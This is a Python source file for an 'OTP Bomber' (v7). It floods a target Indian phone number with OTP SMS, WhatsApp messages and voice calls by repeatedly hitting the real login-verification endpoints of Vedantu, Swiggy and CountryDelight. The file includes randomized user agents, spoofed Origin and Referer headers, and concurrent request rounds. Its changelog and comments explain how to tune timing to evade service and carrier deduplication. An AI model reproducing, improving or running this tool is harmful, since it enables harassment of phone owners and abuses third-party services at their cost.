"""
OTP Bomber — tapas.py  (v7 — deduplication fix + real working APIs)
=====================================================================
v7 changes:
  • Root cause identified: 6 Vedantu variants firing in <1s to same backend
    triggered Vedantu's silent deduplication → only 1 OTP actually sent,
    rest acknowledged but dropped. Fixed by keeping only 2 Vedantu variants
    (LOGIN + VOICE) spaced naturally across the round.
  • Removed all confirmed-dead APIs from Heroku US:
      Groww (404), Rapido (404), Cars24 (401), Spinny (DNS fail)
  • Added proven APIs from original v4 that confirmed HTTP 200/202 in logs:
      Swiggy   — HTTP 202 Accepted = async OTP queued (confirmed in v4 logs)
      CountryDelight — HTTP 200 "request processed" (confirmed in v4 logs)
  • Added Byju's — US office + international students = global backend
  • Added Unacademy — NRI/abroad students = accepts US IPs
  • Increased INTER_ROUND_DELAY to 5s — prevents carrier deduplication
    where the same number getting too many OTPs/min from same sender gets
    silently suppressed at carrier level.
  • MAX_RETRIES = 0 — no retry on fail (faster rounds, less duplication)
"""

import asyncio
import aiohttp
import random
import logging
import time as _time

logger = logging.getLogger(__name__)

# ─── User-Agent Pool ──────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
]

_ACCEPT_LANGS = [
    "en-IN,en;q=0.9,hi;q=0.8",
    "hi-IN,hi;q=0.9,en-IN;q=0.8,en;q=0.7",
    "en-US,en;q=0.9,hi;q=0.7",
    "en-IN,en;q=0.8",
]

def _rand_ua():   return random.choice(_UA_POOL)
def _rand_lang(): return random.choice(_ACCEPT_LANGS)


# ═══════════════════════════════════════════════════════════════════════════════
# ─── API DEFINITIONS ──────────────────────────────────────────────────────────
#
#  Selection criteria for this list (Heroku US):
#   ✓ Confirmed HTTP 200/202 from US IPs (from live logs)
#   ✓ NRI-facing / international-student platforms that MUST accept US IPs
#   ✓ Services operating outside India (UAE, US, SG) — same global backend
#   ✗ Anything returning 401/403/404 from US → excluded
#   ✗ DNS failures from Heroku → excluded
#
#  {phone}    = 10-digit         e.g. 9876543210
#  {phone_cc} = with +91 prefix  e.g. +919876543210
# ═══════════════════════════════════════════════════════════════════════════════

APIS = [

    # ══════════════════════════════════════════════════════════════════════════
    # 📱  SMS
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu LOGIN — NRI/abroad student OTP. Confirmed HTTP 200 from Heroku US.
        # Only 1 Vedantu SMS variant kept to avoid same-backend deduplication.
        "name": "Vedantu-SMS",
        "kind": "sms",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "LOGIN"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Swiggy — HTTP 202 Accepted = OTP queued async (confirmed working in v4).
        # Swiggy operates in UAE/Singapore → backend accepts non-Indian IPs.
        "name": "Swiggy-SMS",
        "kind": "sms",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
            "__fetch_req__": "1",
        },
    },
    {
        # CountryDelight — confirmed "request processed" HTTP 200 in v4 logs.
        "name": "CountryDelight-SMS",
        "kind": "sms",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
        "ok_hint": "request processed",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 💬  WhatsApp
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu WhatsApp — separate delivery channel from SMS above.
        "name": "Vedantu-WA",
        "kind": "whatsapp",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "WHATSAPP"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Swiggy WhatsApp OTP — 202 Accepted = WA OTP queued.
        "name": "Swiggy-WA",
        "kind": "whatsapp",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
            "__fetch_req__": "1",
        },
    },
    {
        # CountryDelight WhatsApp OTP
        "name": "CountryDelight-WA",
        "kind": "whatsapp",
        "url":  "https://api.countrydelight.in/api/auth/new_request_otp/?format=json",
        "method": "POST",
        "json": {"phone": "{phone}", "medium": "whatsapp"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.countrydelight.in",
            "Referer": "https://www.countrydelight.in/",
        },
        "ok_hint": "request processed",
    },

    # ══════════════════════════════════════════════════════════════════════════
    # 📞  CALL / Voice OTP
    # ══════════════════════════════════════════════════════════════════════════

    {
        # Vedantu VOICE — IVR call trigger. Only 1 Vedantu call variant to avoid
        # deduplication on same backend. Confirmed HTTP 200 from Heroku US.
        "name": "Vedantu-Call",
        "kind": "call",
        "url":  "https://user.vedantu.com/user/preLoginVerification",
        "method": "POST",
        "json": {"mobile": "{phone}", "countryCode": "+91", "type": "VOICE"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.vedantu.com",
            "Referer": "https://www.vedantu.com/",
        },
        "ok_hint": "smsSent",
    },
    {
        # Swiggy Voice — IVR call OTP. 202 = call queued.
        "name": "Swiggy-Call",
        "kind": "call",
        "url":  "https://www.swiggy.com/dapi/auth/otp-generate",
        "method": "POST",
        "json": {"mobile": "{phone}", "medium": "voice"},
        "base_headers": {
            "Content-Type": "application/json",
            "Origin": "https://www.swiggy.com",
            "Referer": "https://www.swiggy.com/",
            "__fetch_req__": "1",
        },
    },
]

API_COUNT      = len(APIS)
SMS_COUNT      = sum(1 for a in APIS if a["kind"] == "sms")
WHATSAPP_COUNT = sum(1 for a in APIS if a["kind"] == "whatsapp")
CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")


# ─── Circuit breaker ──────────────────────────────────────────────────────────

CIRCUIT_THRESHOLD = 3    # open after 3 fails → fast skip of dead APIs
COOLDOWN_SEC      = 60.0 # cool for 60s before retrying

_api_fail_count:     dict[str, int]   = {}
_api_cooldown_until: dict[str, float] = {}


def _is_cooled(name: str) -> bool:
    return _time.monotonic() < _api_cooldown_until.get(name, 0.0)


def _record_fail(name: str):
    _api_fail_count[name] = _api_fail_count.get(name, 0) + 1
    if _api_fail_count[name] >= CIRCUIT_THRESHOLD:
        _api_cooldown_until[name] = _time.monotonic() + COOLDOWN_SEC
        _api_fail_count[name] = 0
        logger.info(f"🔴 [{name}] Circuit open — cooling {COOLDOWN_SEC}s")


def _record_ok(name: str):
    _api_fail_count[name] = 0
    _api_cooldown_until.pop(name, None)


# ─── Response analysis ────────────────────────────────────────────────────────

_FAIL_PATTERNS = (
    '"success":false', '"success": false',
    '"status":"error"', '"status": "error"',
    '"status":"fail"', '"status":"failed"',
    '"status":"failure"', '"status":"FAILURE"',
    '"error":true', '"iserror":true',
    '"error_code":', '"errorCode":',
    "invalid mobile", "invalid number", "invalid phone number",
    "captcha required", "captcha_required", "recaptcha",
    "too many request", "rate limit", "rate_limit", "throttle",
    '"statuscode":400', '"statuscode":429', '"statuscode":401', '"statuscode":403',
    '"code":400', '"code":429', '"code":401', '"code":403',
    '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
    '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
    "otp not sent", "could not send", "failed to send",
    '"result":"fail"', '"result":"failure"',
    "phone number not valid", "mobile not valid",
    "not a valid mobile", "number is invalid",
    "blocked", "suspended", "deactivated",
    "service unavailable", "maintenance",
    "unexpected error", "internal server error",
    "not allowed",
)

_OK_PATTERNS = (
    '"success":true', '"success": true',
    '"status":"success"', '"status": "success"',
    '"status":"ok"', '"status": "ok"',
    '"result":"success"', '"result": "success"',
    '"smsSent":true', '"smsSent": true',
    '"sms_sent":true', '"otp_sent":true',
    '"otpSent":true', '"otpSent": true',
    '"whatsappSent":true', '"callSent":true',
    "otp sent", "otp has been sent",
    "otp generated", "otp send successfully", "otp sent successfully",
    "otp successfully sent",
    "sms sent successfully", "sms send successfully",
    '"nonce":', '"otpId":', '"otp_id":',
    '"otp_reference":', '"txnId":',
    '"requestId":', '"request_id":',
    '"session_id":', '"sessionId":',
    '"tid":',
    '"statuscode":0', '"statusCode":0', '"code":0',
    '"status":1', '"status": 1',
    '"response_code":"success"', '"response_code": "success"',
    '"response_code":"SUCCESS"',
    '"otp":', '"otp_value":',
    '"message":"otp', '"message": "otp',
    '"message":"success"', '"message": "success"',
    '"message":"sent"', '"msg":"otp', '"msg":"success"',
    "request processed",
)


def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
    stripped = body.strip()

    # HTTP 202 Accepted = async OTP dispatch (Swiggy pattern — confirmed)
    if status == 202:
        return True

    # Any 4xx/5xx is a failure — do not let body patterns override this
    if status >= 400:
        return False

    if stripped in ("", "(no body)"):
        return False

    low = stripped.lower()

    # HTML = CDN/WAF/maintenance page
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False

    # Literal failure scalars
    if low in ("false", "null", "0", "undefined", "[]", "{}"):
        return False

    # Fail patterns take priority
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False

    # Per-API hint confirmed
    if ok_hint and ok_hint.lower() in low:
        return True

    # Generic ok patterns
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True

    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle",
                                   "slow down", "retry after"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request (direct, no proxy) ───────────────────────────────────

async def _fire_single(
    url: str, method: str, headers: dict,
    payload, name: str,
    form_encoded: bool = False,
    ok_hint: str = "",
):
    timeout = aiohttp.ClientTimeout(total=20, connect=8)
    kw: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
    if isinstance(payload, dict):
        if form_encoded:
            kw["data"] = payload
        else:
            kw["json"] = payload

    connector = aiohttp.TCPConnector(ssl=False, limit=0)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:
            async with getattr(s, method)(url, **kw) as resp:
                status = resp.status
                try:
                    raw     = await asyncio.wait_for(resp.read(), timeout=6)
                    snippet = raw[:700].decode("utf-8", errors="replace")
                except Exception:
                    snippet = "(no body)"

        ok = _body_ok(snippet, status, ok_hint)
        return ok, status, snippet

    except asyncio.TimeoutError:
        return False, 0, "TIMEOUT"
    except Exception as exc:
        return False, -1, str(exc)[:120]


# ─── Fire one API ─────────────────────────────────────────────────────────────

# No retries — a failed request won't suddenly succeed by resending to same
# number within seconds; it just risks carrier-level deduplication.
MAX_RETRIES = 0


async def call_api(api: dict, phone: str):
    name         = api["name"]
    kind         = api.get("kind", "sms")
    icon         = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc     = f"+91{phone}"
    ok_hint      = api.get("ok_hint", "")
    form_encoded = api.get("form_encoded", False)
    payload_key  = "data" if form_encoded else "json"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skip")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url     = _substitute(api["url"], phone, phone_cc)
    method  = api["method"].lower()
    payload = _substitute(api[payload_key], phone, phone_cc)

    def _make_headers() -> dict:
        h = dict(api.get("base_headers", {}))
        h.setdefault("User-Agent",      _rand_ua())
        h.setdefault("Accept",          "application/json, text/plain, */*")
        h.setdefault("Accept-Language", _rand_lang())
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        h["sec-fetch-dest"]  = "empty"
        h["sec-fetch-mode"]  = "cors"
        h["sec-fetch-site"]  = "same-origin"
        return _substitute(h, phone, phone_cc)

    ok, status, snippet = await _fire_single(
        url, method, _make_headers(), payload, name, form_encoded, ok_hint
    )

    if ok:
        _record_ok(name)
        logger.info(f"✅ {icon}[{name}] HTTP {status} | {snippet[:160]}")
        return (name, kind, True, status, snippet[:160])

    logger.info(f"❌ {icon}[{name}] HTTP {status} | {snippet[:160]}")
    _record_fail(name)
    return (name, kind, False, status, snippet[:160])


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g.setdefault(api["kind"], []).append(api)
    return g


# ─── One round: fire all APIs ─────────────────────────────────────────────────

async def _fire_round(phone: str) -> list:
    tasks   = [call_api(api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return list(results)


# ─── Dummy proxy pool stub (compatibility with main.py) ───────────────────────

async def refresh_proxy_pool():
    """No-op — proxy pool removed in v5."""
    logger.info("ℹ️  Proxy pool disabled (direct requests only)")
    return []


# ─── Main bombing engine ──────────────────────────────────────────────────────

# 5s between rounds — prevents carrier from flagging the same number for
# receiving too many OTPs per minute from the same aggregator/sender.
INTER_ROUND_DELAY = 5.0


async def start_bombing(phone: str, rounds: int, progress_callback=None):
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    logger.info(
        f"🚀 BOMB START | +91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT})"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} ──")

        results    = await _fire_round(phone)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":         sms_ok  += 1
                elif kind == "whatsapp":  wa_ok   += 1
                elif kind == "call":      call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

        # Wait between rounds — key for carrier-level deduplication prevention
        if round_num < rounds:
            await asyncio.sleep(INTER_ROUND_DELAY)

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
